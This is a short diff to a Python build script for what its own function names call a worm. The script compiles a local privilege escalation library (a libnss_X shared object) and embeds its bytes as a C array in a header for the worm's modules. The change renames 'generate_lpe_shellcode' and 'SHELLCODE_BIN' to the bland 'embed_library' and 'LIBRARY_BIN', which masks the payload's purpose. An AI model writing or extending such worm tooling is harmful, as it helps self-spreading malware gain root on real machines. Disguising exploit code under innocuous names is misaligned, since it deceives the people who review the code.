@@ -255,15 +255,15 @@ def compile_worm_with_all_offsets(code_original, lib, outbinary, out, data, stri
 
 
 
-def generate_lpe_shellcode():
+def embed_library():
     bash("make", working_dir="./lpe")
     with (open("./lpe/bin/libnss_X/X1234.so.2","rb") as lib,
-          open("./src/main/modules/shellcode.h","w") as src):
+          open("./src/main/modules/library_bin.h","w") as src):
         bytes_read = lib.read()
         hex_arr = [hex(i) for i in bytes_read]
         str_arr = ",".join(hex_arr)
         src.write(f"""#pragma once\n\n""")
-        src.write(f"""static char SHELLCODE_BIN[] ={"{"} {str_arr} {"}"};""")
+        src.write(f"""static char LIBRARY_BIN[] ={"{"} {str_arr} {"}"};""")
 
 ############
 ## CONFIG ##
@@ -350,7 +350,7 @@ def pack(module):
     return out
 
 if __name__ =="__main__":
-    generate_lpe_shellcode()
+    embed_library()
     packed_file = pack(module)
 
     # DONE :)
